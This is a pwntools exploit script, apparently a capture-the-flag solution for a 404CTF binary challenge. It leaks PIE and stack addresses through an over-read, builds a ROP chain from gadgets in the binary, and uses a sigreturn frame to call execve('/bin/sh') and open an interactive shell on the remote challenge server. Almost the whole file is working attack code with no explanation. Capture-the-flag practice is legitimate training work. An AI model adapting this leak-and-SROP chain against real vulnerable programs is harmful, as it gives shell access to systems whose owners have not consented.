#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')
context.terminal = ["cmd.exe", "/c", "start", "wsl.exe"]

host = args.HOST or 'challenges.404ctf.fr'
port = int(args.PORT or 32468)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *main+79
b *main+174
continue
'''.format(**locals())

# -- Exploit goes here --

SET_EDI_RSI_EDX_EAX = 0x377  # mov edi, dword ptr [rbp - 4]; mov rsi, qword ptr [rbp - 0x10]; mov edx, dword ptr [rbp - 8]; mov eax, 0; syscall;
SET_EAX = 0x32f  # mov eax, dword ptr [rbp - 8]; pop rbp; ret; 
POP_RBP = 0x332  # pop rbp; ret;
SYSCALL = 0x364

OFFSET_BOUCLE = 28
OFFSET = 40

def leak_pie():
    io.sendlineafter(b">> ", b"a"*15)
    io.recvuntil(b"a"*15 + b"\n")
    return u64(io.recvn(6).ljust(8, b"\0"))


def leak_stack():
    io.sendlineafter(b">> ", b"a"*31)
    io.recvuntil(b"a"*31 + b"\n")
    return u64(io.recvn(6).ljust(8, b"\0"))


io = start()

pie = leak_pie()
rbp = leak_stack()
buf_addr = rbp - 0x30
exe.address = pie - 0x43a

success(f"{pie = :#x}")
success(f"{rbp = :#x}")
success(f"{buf_addr = :#x}")
success(f"{exe.address = :#x}")


pld1 = flat({
    16: buf_addr,               # rdi
    24: p32(1000),              # rdx
    OFFSET_BOUCLE: p32(0),
    OFFSET - 8: rbp - 0x10,
    OFFSET: p64(exe.address + SET_EDI_RSI_EDX_EAX)[:-2]  # remove the 2 useless last bytes to fit exactly the max number of bytes to read
})

io.sendafter(b">> ", pld1)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = buf_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = exe.address + SYSCALL

pld2 = flat({
    0: b"/bin/sh\0",
    24: 0xf,
    56: exe.address + POP_RBP,
    64: buf_addr + 32,
    72: exe.address + SET_EAX,
    88: exe.address + SYSCALL,
    96: bytes(frame)
})

io.sendline(pld2)

io.interactive()

